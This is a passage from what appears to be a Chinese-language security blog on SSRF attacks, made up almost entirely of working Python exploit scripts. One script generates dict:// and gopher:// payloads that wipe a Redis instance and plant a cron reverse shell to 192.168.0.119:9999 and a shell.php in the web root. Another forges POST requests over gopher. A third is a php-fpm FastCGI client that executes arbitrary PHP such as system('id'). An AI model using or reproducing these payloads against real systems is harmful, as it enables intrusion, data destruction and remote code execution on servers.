class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">6379</span></span><br><span class="line">cmds = [</span><br><span class="line">    [<span class="string">&#x27;flushall&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;set x&#x27;</span>, <span class="string">&#x27;\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;config set dir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;config set dbfilename&#x27;</span>, <span class="string">&#x27;shell.php&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;save&#x27;</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dict_</span>(<span class="params">cmd</span>):</span><br><span class="line">    v = <span class="literal">None</span> <span class="keyword">if</span> <span class="built_in">len</span>(cmd) == <span class="number">1</span> <span class="keyword">else</span> cmd [<span class="number">1</span>]</span><br><span class="line">    cmd = <span class="string">&#x27;:&#x27;</span>.join (cmd [<span class="number">0</span>].split ())</span><br><span class="line">    <span class="keyword">if</span> v:</span><br><span class="line">        cmd += <span class="string">&#x27;:&#x27;</span> + v</span><br><span class="line">    <span class="keyword">return</span> a2b_hex (<span class="string">&#x27;&#x27;</span>.join (<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gophar</span>(<span class="params">cmd</span>):</span><br><span class="line">    v = <span class="literal">None</span> <span class="keyword">if</span> <span class="built_in">len</span>(cmd) == <span class="number">1</span> <span class="keyword">else</span> cmd [<span class="number">1</span>]</span><br><span class="line">    cmd = cmd [<span class="number">0</span>].split ()</span><br><span class="line">    <span class="keyword">if</span> v:</span><br><span class="line">        cmd.append (v)</span><br><span class="line">    result = <span class="string">&#x27;*% d\r\n&#x27;</span> % <span class="built_in">len</span>(cmd)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        result += <span class="string">&#x27;$% d\r\n% s\r\n&#x27;</span> % (<span class="built_in">len</span>(c), c)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;dict://% s:% d/% s&#x27;</span> % (ip, port, quote (dict_(cmd), <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    <span class="string">&#x27;gopher://% s:% d/_% s&#x27;</span> % (</span><br><span class="line">        ip, port,</span><br><span class="line">        quote (<span class="string">&#x27;&#x27;</span>.join ((gophar (cmd) <span class="keyword">for</span> cmd <span class="keyword">in</span> cmds)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="伪造 -POST"><a href="# 伪造 -POST" class="headerlink" title="伪造 POST"></a>伪造 POST</h2><p>利用 gophar 协议可以发送 POST 请求。</p><blockquote><p>注意：修改 Content-Length 以及 data 的 url 编码。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">path = <span class="string">&#x27;/index.php&#x27;</span></span><br><span class="line">headers = [</span><br><span class="line">    <span class="string">&#x27;User-Agent: curl/7.43.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept: */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length: 0&#x27;</span></span><br><span class="line">]</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;gopher://% s:% d/_% s&#x27;</span> % (ip, port, quote (<span class="string">&#x27;POST % s HTTP/1.1\r\nHost: % s\r\n% s\r\n\r\n% s&#x27;</span> % (path, ip, <span class="string">&#x27;\r\n&#x27;</span>.join (headers), data))))</span><br></pre></td></tr></table></figure><blockquote><p>实际上，gophar 协议可以发送任何 TCP 数据包。</p></blockquote><h2 id="攻击 -FPM"><a href="# 攻击 -FPM" class="headerlink" title="攻击 FPM"></a>攻击 FPM</h2><p>大部分情况下 fpm 运行在内网 9000 端口，<code>dict://127.0.0.1:9000/</code>。利用 SSRF 的攻击脚本如下，例如 <code>python fpm_ssrf.py -c &#39;&lt;?php system (&quot;id&quot;);exit;?&gt;&#39; -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code>，注意需要的值一个在服务器中绝对路径的 php 文件，返回 gophar 协议编码的 paylaod。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bchr</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes (<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([i])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bord</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(c, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(c)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_bytes</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode (<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">force_text</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">issubclass</span>(<span class="built_in">type</span>(s), <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>):</span><br><span class="line">        s = <span class="built_in">str</span>(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FastCGIClient</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"> </span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = <span class="built_in">dict</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__connect</span>(<span class="params">self</span>):</span><br><span class="line">        self.sock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout (self.timeout)</span><br><span class="line">        self.sock.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt (socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt (socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect ((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close ()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr (FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr (fcgi_type) \</span><br><span class="line">               + bchr ((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr (requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr ((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr (length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr (<span class="number">0</span>) \</span><br><span class="line">               + bchr (<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr (nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr ((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr ((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr ((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr (nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr (vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr ((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr ((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr ((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr (vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header [<span class="string">&#x27;version&#x27;</span>] = bord (stream [<span class="number">0</span>])</span><br><span class="line">        header [<span class="string">&#x27;type&#x27;</span>] = bord (stream [<span class="number">1</span>])</span><br><span class="line">        header [<span class="string">&#x27;requestId&#x27;</span>] = (bord (stream [<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord (stream [<span class="number">3</span>])</span><br><span class="line">        header [<span class="string">&#x27;contentLength&#x27;</span>] = (bord (stream [<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord (stream [<span class="number">5</span>])</span><br><span class="line">        header [<span class="string">&#x27;paddingLength&#x27;</span>] = bord (stream [<span class="number">6</span>])</span><br><span class="line">        header [<span class="string">&#x27;reserved&#x27;</span>] = bord (stream [<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read (<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader (header)</span><br><span class="line">            record [<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys ():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record [<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record [<span class="string">&#x27;content&#x27;</span>] += buffer.read (contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys ():</span><br><span class="line">                skiped = buffer.read (<span class="built_in">int</span>(record [<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">       <span class="comment"># if not self.__connect ():</span></span><br><span class="line">        <span class="comment">#    print (&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"> </span><br><span class="line">        requestId = random.randint (<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests [requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr (<span class="number">0</span>) \</span><br><span class="line">                                 + bchr (FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr (self.keepalive) \</span><br><span class="line">                                 + bchr (<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord (FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items ():</span><br><span class="line">                name = force_bytes (name)</span><br><span class="line">                value = force_bytes (value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams (name, value)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord (FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord (FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord (FastCGIClient.__FCGI_TYPE_STDIN, force_bytes (post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord (FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode (request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send (request)</span></span><br><span class="line">        <span class="comment"># self.requests [requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests [requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse (requestId)</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv (<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"> </span><br><span class="line">        data = BytesIO (data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord (data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response [<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response [<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response [<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests [<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response [<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests [requestId][<span class="string">&#x27;response&#x27;</span>] += response [<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response [<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests [requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests [requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser (description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo (); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument (<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"> </span><br><span class="line">    args = parser.parse_args ()</span><br><span class="line"> </span><br><span class="line">    client = FastCGIClient (args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params 